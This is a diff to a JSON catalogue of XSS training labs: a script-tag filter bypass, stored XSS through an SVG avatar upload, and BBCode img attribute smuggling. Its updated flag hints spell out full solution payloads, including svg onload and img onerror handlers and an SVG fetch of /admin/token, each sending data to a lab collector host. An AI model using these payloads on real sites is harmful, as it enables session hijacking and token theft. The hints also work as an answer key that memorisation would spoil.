@@ -679,9 +679,9 @@
         "slug": "reflected-xss-script-tag-filtered-ladder",
         "title": "Filter Bypass Ladder — Blocked <script> Tags",
         "difficulty": "practitioner",
-        "description": "A Go-based support form single-pass strips the substrings '<script', '</script', 'javascript:', and 'onerror=' (case-insensitive) from ?subject= before echoing it into HTML. The single-pass replacement means recursive constructions survive, and the incomplete event-handler list leaves many vectors open. This lab expects the solver to climb multiple rungs of the bypass ladder.",
-        "objective": "Bypass the substring filter to execute JavaScript in the admin bot's context and exfiltrate the admin session cookie to http://collector:9000/report?c=.",
-        "flag_hint": "OOB collector on port 9000 receives the cookie; /solve compares against the live admin cookie and prints the flag.",
+        "description": "A support form single-pass strips the substrings '<script', '</script', 'javascript:', and 'onerror=' (case-insensitive) from ?subject= before echoing it RAW into HTML. Single-pass replacement means recursive constructions survive, and the incomplete blocklist (no <svg/onload, no other event handlers, onerror with whitespace before =) leaves many vectors open — the solver climbs a bypass ladder.",
+        "objective": "Bypass the substring blocklist to run JavaScript in the admin bot's context (e.g. <svg onload>) and exfiltrate the admin session cookie to http://collector:9000/report?c=, then POST /solve.",
+        "flag_hint": "Submit /?subject=<svg onload=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> (URL-encoded) to POST /report; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "single-pass filter recursion tricks (e.g. <scr<script>ipt>)",
           "SVG animate/onbegin payloads",
@@ -689,12 +689,12 @@
           "non-script event handlers such as ontoggle on <details>"
         ],
         "tech_stack": [
-          "Go 1.23",
-          "net/http",
-          "hand-rolled reflection via fmt.Fprint (bypassing html/template)",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "single-pass substring blocklist filter (no html/template)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "abstracted from dozens of HackerOne reports on naïve server-side blocklists (e.g. Shopify H1 #423876 pattern)"
       },
@@ -702,9 +702,9 @@
         "slug": "stored-xss-svg-avatar-upload",
         "title": "Stored XSS via SVG Avatar Upload",
         "difficulty": "practitioner",
-        "description": "A Rails user-profile app accepts SVG avatars. It validates that the Content-Type is image/svg+xml and that the file begins with '<svg' but does not strip embedded <script> or event handlers. Uploaded avatars are served from the same origin under /avatars/<uuid>.svg with Content-Type: image/svg+xml, and the admin bot views your profile page (which embeds the avatar via <object>).",
-        "objective": "Upload a malicious SVG so that when the admin bot views your profile page the SVG script executes, fetches /admin/token, and POSTs the JSON body to http://collector:9000/report.",
-        "flag_hint": "/solve compares the token value posted to the OOB endpoint against the current /admin/token; on match returns the flag.",
+        "description": "A profile app accepts SVG avatars, validating only that the Content-Type is image/svg+xml and the bytes begin with '<svg' — it never strips embedded <script>/handlers. Avatars are served same-origin as image/svg+xml and embedded on the profile page via <object> (not <img>), so a scripted SVG runs as a document in the app's origin when the admin bot views the profile.",
+        "objective": "Upload a scripted SVG avatar so that when the admin bot views your profile the SVG runs, fetches the admin-only /admin/token (same-origin, cookie sent), and beacons it to http://collector:9000/report, then POST /solve.",
+        "flag_hint": "POST an <svg><script>fetch('/admin/token')...beacon...</script></svg> to /avatar (multipart, image/svg+xml), submit the returned /u/<id> profile path to POST /report; read the exfiltrated token via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /admin/token is 403 for you.",
         "skills_taught": [
           "SVG as a script container",
           "same-origin file uploads as an XSS vector",
@@ -712,14 +712,12 @@
           "why images belong on a separate origin"
         ],
         "tech_stack": [
-          "Ruby 3.3",
-          "Rails 7.1",
-          "Active Storage on local disk",
-          "PostgreSQL 16",
-          "Puma 6",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "SVG avatar upload served image/svg+xml + <object> embed",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "GitLab CVE-2023-5009 style SVG XSS patterns and multiple HackerOne SVG-upload writeups (Uber, Grammarly)"
       },
@@ -884,9 +882,9 @@
         "slug": "bbcode-parser-img-attribute-smuggling",
         "title": "BBCode [img] Attribute Smuggling",
         "difficulty": "practitioner",
-        "description": "A vintage-forum-inspired app renders [img]URL[/img] as <img src=\"URL\">. The URL is not attribute-encoded, so a URL containing a double quote breaks out into new HTML attributes such as onerror.",
-        "objective": "Post a topic whose rendered <img> tag carries an onerror handler that exfiltrates the admin's session cookie to http://collector:9000/report when the admin bot loads the topic list.",
-        "flag_hint": "OOB collector; /solve returns the flag when the cookie matches the current admin session.",
+        "description": "A vintage-forum-inspired app renders [img]URL[/img] as <img src=\"URL\"> with the URL inserted RAW (not HTML-attribute-encoded), while the rest of the post is escaped. A URL containing a double quote breaks out of src into new attributes such as onerror.",
+        "objective": "Post a topic whose rendered <img> carries an onerror that exfiltrates the admin's session cookie to http://collector:9000/report when the admin bot loads the admin topic board, then POST /solve.",
+        "flag_hint": "POST /topics {\"title\":\"x\",\"body\":\"[img]x\\\" onerror=\\\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\\\"[/img]\"}; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /admin/topics is 403 for you.",
         "skills_taught": [
           "attribute-context injection",
           "quote-based breakout",
@@ -894,12 +892,12 @@
           "why URL contexts need distinct attribute encoding"
         ],
         "tech_stack": [
-          "PHP 8.3",
-          "stripped-down phpBB-inspired forum",
-          "MySQL 8",
-          "Apache 2.4",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "hand-rolled BBCode [img] parser (unencoded src attribute)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "long history of BBCode parser bugs in vBulletin, phpBB and MyBB forks (multiple CVEs 2019-2023)"
       },
